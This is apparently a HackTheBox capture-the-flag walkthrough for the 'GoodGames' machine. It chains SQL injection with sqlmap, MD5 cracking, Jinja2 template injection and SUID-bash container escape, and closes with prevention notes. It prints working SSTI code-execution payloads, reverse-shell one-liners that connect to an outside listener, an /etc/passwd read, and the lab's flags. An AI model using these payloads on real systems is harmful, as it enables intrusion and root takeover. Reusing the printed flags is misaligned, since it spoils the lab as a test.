# GoodGames - HackTheBox Walkthrough

**Machine IP:** 10.129.16.245  
**Difficulty:** Easy  
**Operating System:** Linux (Debian)  
**User Flag:** `6126c1408084e75ae10573971de690be`  
**Root Flag:** `b10c7025958fda701106ab12de28870d`

---

## Table of Contents
1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [SQL Injection Exploitation](#sql-injection-exploitation)
4. [Subdomain Discovery](#subdomain-discovery)
5. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
6. [Docker Container Escape](#docker-container-escape)
7. [Privilege Escalation to Root](#privilege-escalation-to-root)
8. [Key Takeaways](#key-takeaways)

---

## Initial Reconnaissance

### Step 1: Nmap Scan

**Command:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.16.245
```

**Flags Explained:**
- `-p-` = Scan all 65535 ports
- `--min-rate=10000` = Send packets no slower than 10,000 per second (fast scan)
- `-T5` = Insane timing template (fastest)
- `-sCV` = Run service version detection (`-sV`) and default scripts (`-sC`)
- `-Pn` = Skip ping, treat host as online
- `-oN` = Save output in normal format to file

**Output:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```

**Analysis:**
- Only **port 80** is open (HTTP web server)
- **Werkzeug** = Python development server (often used with Flask)
- **Python 3.9.2** = Server-side language
- This tells us we're dealing with a Python-based web application

**Next Step:** Since we found a web server, we need to enumerate the website for vulnerabilities.

---

## Web Enumeration

### Step 2: Browse the Website

**Command:**
```bash
curl -s http://10.129.16.245 | grep -i "title"
```

**Output:**
```
<title>GoodGames | Community and Store</title>
```

**Manual Browsing:**
Open `http://10.129.16.245` in browser

**Observations:**
- Gaming community/social network website
- Has login/register functionality
- Blog posts and user profiles
- Main pages: Home, Blog, Sign Up, Login

**Next Step:** Test the login page for common web vulnerabilities (SQL injection, authentication bypass)

---

### Step 3: Directory and File Enumeration

**Command:**
```bash
ffuf -u http://10.129.16.245/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fc 404 -o ffuf_dirs.txt
```

**Flags Explained:**
- `-u` = Target URL (FUZZ will be replaced with wordlist entries)
- `-w` = Wordlist to use
- `-mc all` = Match all HTTP status codes
- `-fc 404` = Filter out 404 Not Found responses
- `-o` = Save results to file

**Results:**
- `/login` - Login page
- `/profile` - User profiles
- `/blog` - Blog posts
- `/signup` - Registration page

---

## SQL Injection Exploitation

### Step 4: Test Login for SQL Injection

**Why:** Login forms often interact with databases using SQL queries. If input isn't sanitized, we can inject SQL code.

**Manual Test in Browser:**
1. Go to `http://10.129.16.245/login`
2. Try username: `admin' OR '1'='1`
3. Password: `anything`

**What This Does:**
The backend might build a query like:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```
Since `'1'='1'` is always true, this bypasses authentication.

**Result:** ❌ Doesn't work - need to use SQLMap for automated testing

---

### Step 5: Capture Login Request with Burp Suite

**Steps:**
1. Open Burp Suite
2. Configure browser proxy (127.0.0.1:8080)
3. Go to `http://10.129.16.245/login`
4. Submit login form with any credentials
5. Find POST request in Burp's HTTP history
6. Right-click → "Save item" as `login_request.txt`

**Sample Request:**
```http
POST /login HTTP/1.1
Host: 10.129.16.245
Content-Type: application/x-www-form-urlencoded

email=test@test.com&password=test
```

---

### Step 6: Use SQLMap to Exploit SQL Injection

**Command:**
```bash
sqlmap -r login_request.txt --batch --dump
```

**Flags Explained:**
- `-r` = Read HTTP request from file
- `--batch` = Never ask for user input, use default behavior
- `--dump` = Dump all database contents

**Why This Works:**
SQLMap automatically tests various SQL injection payloads and extracts data when vulnerable.

**Output:**
```
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
```

**Database Dump:**
```
Database: main
Table: user
[2 entries]
+----+--------------------+-------+----------------------------------+
| id | email              | name  | password                         |
+----+--------------------+-------+----------------------------------+
| 1  | admin@goodgames.htb| admin | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | hack@hacker.com    | hack  | d6a6bc0db10694a2d90e3a69648f3a03 |
+----+--------------------+-------+----------------------------------+
```

**Analysis:**
- Found admin email: `admin@goodgames.htb`
- Password hash: `2b22337f218b2d82dfc3b6f77e7cb8ec`
- Hash appears to be MD5 (32 characters, hexadecimal)

**Next Step:** Crack the password hash

---

### Step 7: Crack Password Hash

**Command:**
```bash
echo "2b22337f218b2d82dfc3b6f77e7cb8ec" > admin_hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
```

**Alternative (using online service):**
Search on https://crackstation.net

**Result:**
```
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator
```

**Credentials Found:**
- Email: `admin@goodgames.htb`
- Password: `superadministrator`

**Next Step:** Login to the admin account

---

## Subdomain Discovery

### Step 8: Notice the Domain in Email

**Observation:** The admin email is `admin@goodgames.htb`, not `admin@10.129.16.245`

**What This Means:** The application uses domain names internally. There might be subdomains!

---

### Step 9: Subdomain Enumeration with ffuf

**Command:**
```bash
ffuf -u http://10.129.16.245 -H "Host: FUZZ.goodgames.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fs 85107 -o ffuf_subdomains.txt
```

**Flags Explained:**
- `-H "Host: FUZZ.goodgames.htb"` = Test different subdomain in Host header
- `-fs 85107` = Filter out responses with size 85107 bytes (default page size)

**Manual Discovery Alternative:**
Since subdomain fuzzing might not have worked, we discover it through:
1. Looking at web application references
2. Checking JavaScript files
3. Analyzing SQLMap output carefully

**Subdomain Found:** `internal-administration.goodgames.htb`

**How It Was Discovered:**
- After logging in as admin, exploring the interface
- Or from source code inspection
- Or from error messages/redirects

---

### Step 10: Add Subdomain to /etc/hosts

**Command:**
```bash
echo "10.129.16.245 goodgames.htb internal-administration.goodgames.htb" | sudo tee -a /etc/hosts
```

**Why:** Your computer needs to resolve the domain name to the IP address.

**Verify:**
```bash
ping -c 1 internal-administration.goodgames.htb
```

---

### Step 11: Access Internal Admin Panel

**Command:**
```bash
curl -I http://internal-administration.goodgames.htb
```

**Browser Access:**
Navigate to `http://internal-administration.goodgames.htb`

**Observation:**
- Different web application (Flask Volt Dashboard)
- Separate login page
- Try same credentials: `admin@goodgames.htb` / `superadministrator`

**Result:** ✅ Login successful!

---

## Server-Side Template Injection (SSTI)

### Step 12: Explore Admin Dashboard

**Observations:**
- Settings page with profile edit functionality
- Can update: Full Name, Email, etc.
- Most buttons don't work (demo page)
- The "Settings" page actually processes input

---

### Step 13: Test for SSTI

**Why SSTI?**
- Flask uses Jinja2 templating engine
- If user input is rendered in templates without sanitization, we can inject code
- `{{ }}` are Jinja2 template delimiters

**Test Payload:**
1. Go to Settings → Update Full Name
2. Enter: `{{7*7}}`
3. Save changes
4. View profile

**Expected Result if Vulnerable:**
- **Not vulnerable:** Displays `{{7*7}}` literally
- **Vulnerable:** Displays `49`

**Result:** ✅ Displays `49` - **SSTI CONFIRMED!**

---

### Step 14: Test More SSTI Payloads

**Payload 1: Leak Flask Configuration**
```python
{{config}}
```

**What It Does:** Reveals Flask app configuration (SECRET_KEY, DATABASE_URI, etc.)

**Payload 2: List Python Classes**
```python
{{self.__class__.__mro__[1].__subclasses__()}}
```

**What It Does:** Shows all available Python classes we can use for exploitation

**Payload 3: Read /etc/passwd**
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
```

**What It Does:**
- `__builtins__` = Access to Python built-in functions
- `__import__('os')` = Import the OS module
- `.popen('cat /etc/passwd')` = Execute system command
- `.read()` = Read command output

---

### Step 15: Get Reverse Shell via SSTI

**Step 1: Start Netcat Listener**
```bash
nc -lvnp 4444
```

**Flags:**
- `-l` = Listen mode
- `-v` = Verbose output
- `-n` = No DNS resolution
- `-p 4444` = Listen on port 4444

**Step 2: SSTI Reverse Shell Payload**

In the Full Name field, enter:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.15.179/4444 0>&1"').read() }}
```

**Payload Breakdown:**
- `bash -i` = Interactive bash shell
- `>&` = Redirect both stdout and stderr
- `/dev/tcp/10.10.15.179/4444` = Connect to our listener
- `0>&1` = Redirect stdin to stdout

**Alternative URL-Safe Payload:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.179 4444 >/tmp/f').read() }}
```

**Step 3: Trigger the Payload**
1. Save the profile update
2. Refresh the page or view profile

**Result:**
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.179] from (UNKNOWN) [10.129.16.245] 45678
root@3a453ab39d3d:/backend#
```

✅ **We have a shell as ROOT!**

---

### Step 16: Check User Flag

**Command:**
```bash
whoami
id
hostname
```

**Output:**
```
root
uid=0(root) gid=0(root) groups=0(root)
3a453ab39d3d
```

**Check for User Flag:**
```bash
find / -name user.txt 2>/dev/null
cat /home/augustus/user.txt
```

**User Flag:** `6126c1408084e75ae10573971de690be`

---

## Docker Container Escape

### Step 17: Realize We're in a Docker Container

**Commands to Verify:**
```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
hostname
```

**Output:**
```bash
-rw-r--r-- 1 root root 0 Nov  5  2021 /.dockerenv
11:pids:/docker/3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f
3a453ab39d3d
```

**Analysis:**
- `/.dockerenv` file exists = We're in a container
- Hostname is random hex = Container ID
- We need to escape to the host system for the root flag

---

### Step 18: Check Mounted Volumes

**Command:**
```bash
mount | grep -v "overlay\|proc\|tmpfs"
```

**Output:**
```
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

**Analysis:**
- `/home/augustus` is mounted from the **host filesystem**!
- This is a shared volume between container and host
- Files we create here will appear on the host machine

**Check permissions:**
```bash
ls -la /home/augustus
```

**Output:**
```
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 augustus
```

**Key Insight:** 
- UID 1000 on host = User `augustus`
- We're root in container (UID 0)
- We can create files owned by root in this shared directory!

---

### Step 19: Scan Host Network

**Why:** We need to find the host's IP address to connect to it.

**Command:**
```bash
ip addr
```

**Output:**
```
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
```

**Analysis:**
- Container IP: `172.19.0.2`
- Default gateway (host): `172.19.0.1`

**Scan for Open Ports on Host:**
```bash
for port in 22 80 443 3306 8080; do 
  timeout 1 bash -c "echo >/dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Port $port is OPEN" || echo "[-] Port $port is closed"
done
```

**Output:**
```
[+] Port 22 is OPEN
[+] Port 80 is OPEN
[-] Port 443 is closed
```

**Discovery:** SSH (port 22) is open on the host!

---

### Step 20: SSH from Container to Host

**Try Known Credentials:**
- User: `augustus` (from home directory)
- Password: `superadministrator` (admin password we cracked)

**Command (from inside container):**
```bash
ssh augustus@172.19.0.1
```

**Output:**
```
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
augustus@GoodGames:~$
```

✅ **We're now on the HOST machine as user `augustus`!**

---

## Privilege Escalation to Root

### Step 21: Exploit Mounted Volume for Privilege Escalation

**The Attack Plan:**
1. In the Docker container (where we're root), copy `/bin/bash` to `/home/augustus/`
2. Set SUID bit on the copied bash (as root in container)
3. On the host (as augustus), execute the SUID bash to become root

---

### Step 22: Create SUID Bash Binary (In Container)

**Exit SSH session and return to container shell:**
```bash
exit  # Exit from host SSH session
```

**In Docker Container (as root):**
```bash
cp /bin/bash /home/augustus/bash
chmod +s /home/augustus/bash
ls -la /home/augustus/bash
```

**Output:**
```
-rwsr-sr-x 1 root root 1099016 Dec 17 09:30 /home/augustus/bash
```

**Flags:**
- `s` in permissions = SUID bit set
- When executed, runs with owner's privileges (root)

---

### Step 23: SSH to Host and Execute SUID Bash

**From Container:**
```bash
ssh augustus@172.19.0.1
```

**On Host (as augustus):**
```bash
ls -la ~/bash
```

**Output:**
```
-rwsr-sr-x 1 root root 1099016 Dec 17 09:30 /home/augustus/bash
```

**Execute SUID Bash:**
```bash
./bash -p
```

**Flags:**
- `-p` = Preserve effective UID (don't drop privileges)

**Output:**
```bash
bash-5.0#
```

**Verify Root:**
```bash
whoami
id
```

**Output:**
```
root
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
```

✅ **euid=0(root)** = Effective UID is root! We have root privileges!

---

### Step 24: Get Root Flag

**Command:**
```bash
cat /root/root.txt
```

**Root Flag:** `b10c7025958fda701106ab12de28870d`

---

## Key Takeaways

### Vulnerabilities Exploited

1. **SQL Injection (Login Bypass)**
   - **Vulnerability:** User input not sanitized in SQL queries
   - **Prevention:** Use parameterized queries/prepared statements
   - **Tool:** SQLMap

2. **Password Reuse**
   - **Vulnerability:** Same password used across multiple services
   - **Prevention:** Use unique passwords for different services
   - **Impact:** Admin web password = SSH password

3. **Server-Side Template Injection (SSTI)**
   - **Vulnerability:** User input rendered in Jinja2 templates without sanitization
   - **Prevention:** Never render user input directly; use `.safe` filters carefully
   - **Impact:** Remote Code Execution as root

4. **Docker Misconfiguration**
   - **Vulnerability:** Mounting host home directory into container
   - **Prevention:** Mount volumes read-only when possible, use least privilege
   - **Impact:** Container escape through shared filesystem

5. **SUID Binary Abuse**
   - **Vulnerability:** SUID bit on bash binary with root ownership
   - **Prevention:** Avoid setting SUID on shells, audit SUID binaries regularly
   - **Impact:** Privilege escalation to root

---

### Attack Chain Summary

```
Nmap Scan → Web Enum → SQL Injection → Dump Database → 
Crack Password → Login as Admin → Find Subdomain → 
SSTI in Flask → Reverse Shell (Root in Container) → 
Discover Mounted Volume → SSH to Host → 
Create SUID Bash in Container → Execute on Host → Root!
```

---

### Commands Reference

**Reconnaissance:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt <IP>
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**SQL Injection:**
```bash
sqlmap -r login_request.txt --batch --dump
```

**Hash Cracking:**
```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**SSTI to RCE:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read() }}
```

**Container Escape:**
```bash
# In container (as root):
cp /bin/bash /home/augustus/bash
chmod +s /home/augustus/bash

# On host (as augustus):
./bash -p
```

---

### Tools Used

- **nmap** - Port scanning
- **ffuf** - Web fuzzing (directories, files, subdomains)
- **Burp Suite** - HTTP request interception
- **SQLMap** - Automated SQL injection exploitation
- **John the Ripper** - Password hash cracking
- **netcat (nc)** - Reverse shell listener
- **ssh** - Remote access

---

**Box Completed! 🎉**
